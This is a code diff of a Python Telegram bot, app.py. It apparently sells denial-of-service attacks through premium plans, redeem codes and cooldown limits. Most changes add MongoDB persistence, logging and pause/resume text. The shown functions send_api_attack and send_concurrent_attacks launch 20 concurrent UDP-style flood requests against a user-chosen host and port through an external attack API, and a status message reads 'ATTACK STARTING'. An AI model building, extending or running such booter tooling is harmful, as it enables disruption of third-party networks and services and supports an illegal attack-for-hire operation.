@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH WORKING ATTACKS AND PAUSE/RESUME
+# app.py - COMPLETE FIXED VERSION WITH PROPER MONGODB PERSISTENCE
 import os
 import logging
 import asyncio
@@ -33,9 +33,9 @@ PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
 MIN_DURATION = 30
-MAX_DURATION = 100
+MAX_DURATION = 60
 MIN_COOLDOWN = 30
-MAX_COOLDOWN = 100
+MAX_COOLDOWN = 60
 
 # Attack Methods
 ATTACK_METHODS = [
@@ -60,7 +60,7 @@ def index():
 def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
-# ===== DATABASE =====
+# ===== DATABASE - FIXED PERSISTENCE =====
 class Database:
     def __init__(self, mongo_uri):
         self.memory_mode = False
@@ -76,9 +76,11 @@ class Database:
                 self.broadcasts = self.db.broadcasts
                 self.settings = self.db.settings
                 
+                # Create indexes for better performance
                 self.users.create_index("user_id", unique=True)
                 self.codes.create_index("code", unique=True)
                 self.broadcasts.create_index("created_at", -1)
+                self.admins.create_index("user_id", unique=True)
                 
                 # Initialize settings if not exists
                 if not self.settings.find_one({"_id": "bot_settings"}):
@@ -90,11 +92,20 @@ class Database:
                         "pause_reason": None
                     })
                 
-                logger.info("✅ MongoDB connected")
+                logger.info("✅ MongoDB connected successfully!")
+                logger.info(f"📊 Database: guru_bot")
+                logger.info(f"📊 Collections: users, codes, logs, admins, broadcasts, settings")
+                
+                # Log existing data count
+                user_count = self.users.count_documents({})
+                admin_count = self.admins.count_documents({})
+                code_count = self.codes.count_documents({})
+                logger.info(f"📊 Existing Data: {user_count} users, {admin_count} admins, {code_count} codes")
+                
             else:
-                raise Exception("No MongoDB URI")
+                raise Exception("No MongoDB URI provided")
         except Exception as e:
-            logger.warning(f"⚠️ MongoDB failed: {e}, using in-memory")
+            logger.error(f"❌ MongoDB connection failed: {e}")
             self.memory_mode = True
             self.users = {}
             self.codes = {}
@@ -102,6 +113,7 @@ class Database:
             self.admins = {}
             self.broadcasts = []
             self.settings = {"pause_all": False}
+            logger.warning("⚠️ Using in-memory storage (data will be lost on restart!)")
     
     def add_user(self, user_id, username=None, first_name=None):
         if not self.memory_mode:
@@ -119,10 +131,12 @@ class Database:
                     "banned_by": None,
                     "banned_at": None,
                     "last_attack_time": None,
-                    "last_attack_duration": 0
+                    "last_attack_duration": 0,
+                    "created_at": datetime.now()
                 }},
                 upsert=True
             )
+            logger.info(f"✅ User {user_id} added/updated in database")
             return result
         else:
             if user_id not in self.users:
@@ -189,7 +203,7 @@ class Database:
                     "has_used_code": True if plan == "premium" else False
                 }}
             )
-            logger.info(f"✅ Updated user {user_id} plan to {plan}, expiry: {expiry_str}, modified: {result.modified_count}")
+            logger.info(f"✅ Updated user {user_id} plan to {plan}, expiry: {expiry_str}")
             return result.modified_count > 0 or result.matched_count > 0
         else:
             if user_id in self.users:
@@ -236,6 +250,7 @@ class Database:
                 "added_at": datetime.now()
             })
             self.update_user_plan(user_id, "premium", None)
+            logger.info(f"✅ Admin {user_id} ({level}) added by {added_by}")
             return True
         else:
             if user_id in self.admins:
@@ -249,7 +264,10 @@ class Database:
     def remove_admin(self, user_id):
         if not self.memory_mode:
             result = self.admins.delete_one({"user_id": user_id})
-            return result.deleted_count > 0
+            if result.deleted_count > 0:
+                logger.info(f"✅ Admin {user_id} removed")
+                return True
+            return False
         else:
             if user_id in self.admins:
                 del self.admins[user_id]
@@ -272,6 +290,7 @@ class Database:
                 {"user_id": user_id},
                 {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
             )
+            logger.info(f"✅ User {user_id} banned by {banned_by}")
         elif user_id in self.users:
             self.users[user_id]["is_banned"] = True
             self.users[user_id]["ban_reason"] = reason
@@ -282,6 +301,7 @@ class Database:
                 {"user_id": user_id},
                 {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
             )
+            logger.info(f"✅ User {user_id} unbanned")
         elif user_id in self.users:
             self.users[user_id]["is_banned"] = False
             self.users[user_id]["ban_reason"] = None
@@ -382,31 +402,8 @@ class Database:
                 }}
             )
             
-            logger.info(f"✅ UPDATE RESULT: matched={result.matched_count}, modified={result.modified_count}")
-            
-            if result.matched_count > 0:
-                logger.info(f"✅ SUCCESS: User {user_id} redeemed code {code} - Plan: premium, Expiry: {expiry_str}")
-                return code_data
-            else:
-                logger.error(f"❌ User {user_id} not found or update failed")
-                self.add_user(user_id)
-                result2 = self.users.update_one(
-                    {"user_id": user_id},
-                    {"$set": {
-                        "plan": "premium",
-                        "plan_expiry": expiry_str,
-                        "has_used_code": True,
-                        "code_used": code,
-                        "redeem_date": datetime.now().isoformat()
-                    }},
-                    upsert=True
-                )
-                if result2.matched_count > 0 or result2.modified_count > 0:
-                    logger.info(f"✅ User {user_id} created and redeemed code {code}")
-                    return code_data
-                else:
-                    logger.error(f"❌ Failed to create/update user {user_id}")
-                    return None
+            logger.info(f"✅ User {user_id} redeemed code {code} - Plan: premium")
+            return code_data
         else:
             if code in self.codes and not self.codes[code]["is_used"]:
                 code_data = self.codes[code]
@@ -467,7 +464,10 @@ class Database:
     def delete_code(self, code):
         if not self.memory_mode:
             result = self.codes.delete_one({"code": code})
-            return result.deleted_count > 0
+            if result.deleted_count > 0:
+                logger.info(f"✅ Code {code} deleted")
+                return True
+            return False
         else:
             if code in self.codes:
                 del self.codes[code]
@@ -477,6 +477,7 @@ class Database:
     def delete_used_codes(self):
         if not self.memory_mode:
             result = self.codes.delete_many({"is_used": True})
+            logger.info(f"✅ {result.deleted_count} used codes deleted")
             return result.deleted_count
         else:
             count = 0
@@ -497,6 +498,7 @@ class Database:
                 "media_type": media_type,
                 "created_at": datetime.now()
             })
+            logger.info(f"✅ Broadcast {broadcast_id} logged: {successful}/{total_users} success")
         else:
             self.broadcasts.append({
                 "broadcast_id": broadcast_id,
@@ -550,8 +552,8 @@ class Database:
                 }},
                 upsert=True
             )
+            logger.info(f"✅ Bot pause set to {paused} by {paused_by}")
         self.settings["pause_all"] = paused
-        logger.info(f"✅ Bot pause set to {paused} by {paused_by}")
     
     def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=20):
         log = {
@@ -605,6 +607,7 @@ def init_owner():
     plan, expiry = db.get_user_plan(OWNER_ID)
     if plan != "premium":
         db.update_user_plan(OWNER_ID, "premium", None)
+    logger.info(f"✅ Owner {OWNER_ID} initialized")
 
 def init_pseudo_owner():
     if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
@@ -618,6 +621,7 @@ def init_pseudo_owner():
         plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
         if plan != "premium":
             db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
+        logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
 
 init_owner()
 init_pseudo_owner()
@@ -909,9 +913,8 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK - FIXED =====
+# ===== API ATTACK =====
 async def send_api_attack(target, port, duration, attack_num, api_key, api_url, method):
-    """Send single API attack request - FIXED with proper error handling"""
     params = {
         "key": api_key,
         "host": target,
@@ -982,9 +985,8 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url, 
             "method": method
         }
 
-# ===== CONCURRENT ATTACKS - FIXED =====
+# ===== CONCURRENT ATTACKS =====
 async def send_concurrent_attacks(target, port, duration, user_id, context, method="UDP"):
-    """Send multiple concurrent attacks - FIXED with better error handling"""
     logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent {method} attacks on {target}:{port}")
     
     api_key = os.getenv("API_KEY")
@@ -999,7 +1001,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         )
         return None
     
-    # Send initial message
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK STARTING*\n\n"
@@ -1011,23 +1012,19 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
         parse_mode='Markdown'
     )
     
-    # Create all tasks
     tasks = []
     for i in range(1, MAX_CONCURRENT + 1):
         task = send_api_attack(target, port, duration, i, api_key, api_url, method)
         tasks.append(task)
     
-    # Start timer update task
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
     
-    # Run all tasks concurrently
     start_time = time.time()
     results = await asyncio.gather(*tasks, return_exceptions=True)
     elapsed = time.time() - start_time
     
     timer_task.cancel()
     
-    # Process results
     success_count = 0
     failed_count = 0
     result_details = []
@@ -1045,7 +1042,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
                 error = r.get('error', r.get('response', 'Unknown error'))
                 result_details.append(f"❌ Attack {r.get('attack_num', '?')} - {error[:30]}")
     
-    # Create final message
     cooldown = attack_manager.get_cooldown_time(duration)
     
     final_text = (
@@ -1080,7 +1076,6 @@ async def send_concurrent_attacks(target, port, duration, user_id, context, meth
     }
 
 async def update_timer(status_msg, duration, target, port, method="UDP"):
-    """Update the attack timer in the message"""
     try:
         start_time = time.time()
         last_update = 0
@@ -1363,16 +1358,16 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Toggle pause for all members - FIXED for Owner and Pseudo Owner"""
     user_id = update.effective_user.id
     
-    # Check if user is owner OR pseudo_owner (both have equal power)
+    # Check if user is owner OR pseudo_owner
     if not db.is_owner_or_pseudo(user_id):
-        await update.message.reply_text("❌ Only Owner and Pseudo_Owner can pause/unpause the bot!")
+        await update.message.reply_text("❌ Only Owner and Pseudo_Owner can pause/resume the bot!")
         return
     
     current_pause_info = db.get_pause_info()
     current_pause = current_pause_info.get('paused', False)
     
     if current_pause:
-        # UNPAUSE / RESUME - Both Owner and Pseudo Owner can unpause
+        # RESUME / UNPAUSE
         db.set_pause(False, user_id)
         await update.message.reply_text(
             "✅ *Bot Resumed / Unpaused*\n\n"
@@ -1386,7 +1381,7 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 await context.bot.send_message(
                     chat_id=admin['user_id'],
-                    text=f"✅ *Bot Resumed / Unpaused*\n\nBy: `{user_id}`",
+                    text=f"✅ *Bot Resumed*\n\nBy: `{user_id}`",
                     parse_mode='Markdown'
                 )
             except:
@@ -1399,8 +1394,7 @@ async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⏸️ *Bot Paused*\n\n"
             f"All users are now paused from using the bot.\n"
             f"Reason: {reason}\n\n"
-            f"Use `/pause` again to resume/unpause the bot.\n"
-            f"Or use the Owner Panel → UNPAUSE BOT button.",
+            f"Use `/pause` again to resume/unpause the bot.",
             parse_mode='Markdown'
         )
         
@@ -1430,7 +1424,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = db.is_admin(user_id)
     is_owner = db.is_owner_or_pseudo(user_id)
     
-    logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}, Is Owner: {is_owner}")
+    logger.info(f"User {user_id} - Plan: {plan}, Is Admin: {is_admin}, Is Owner: {is_owner}")
     
     # Check pause status
     pause_info = db.get_pause_info()
@@ -1442,7 +1436,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"The bot is currently paused.\n"
             f"Reason: {reason}\n"
             f"Paused by: `{paused_by}`\n\n"
-            f"Please wait until it's resumed/unpaused.",
+            f"Please wait until it's resumed.",
             parse_mode='Markdown'
         )
         return
@@ -2283,7 +2277,7 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     current_pause = current_pause_info.get('paused', False)
     
     if current_pause:
-        # RESUME / UNPAUSE - Both Owner and Pseudo Owner can resume
+        # RESUME / UNPAUSE
         db.set_pause(False, user_id)
         await query.edit_message_text(
             "✅ *Bot Resumed / Unpaused*\n\n"
@@ -2298,7 +2292,7 @@ async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             try:
                 await context.bot.send_message(
                     chat_id=admin['user_id'],
-                    text=f"✅ *Bot Resumed / Unpaused*\n\nBy: `{user_id}`",
+                    text=f"✅ *Bot Resumed*\n\nBy: `{user_id}`",
                     parse_mode='Markdown'
                 )
             except:
@@ -3047,6 +3041,7 @@ if __name__ == "__main__":
     print("📌 Owner & Pseudo_Owner have equal powers")
     print("📌 Broadcast: Text, Photos, Videos")
     print("📌 Pause/Resume for all members (Owner & Pseudo Owner)")
+    print("📌 MongoDB Persistence")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
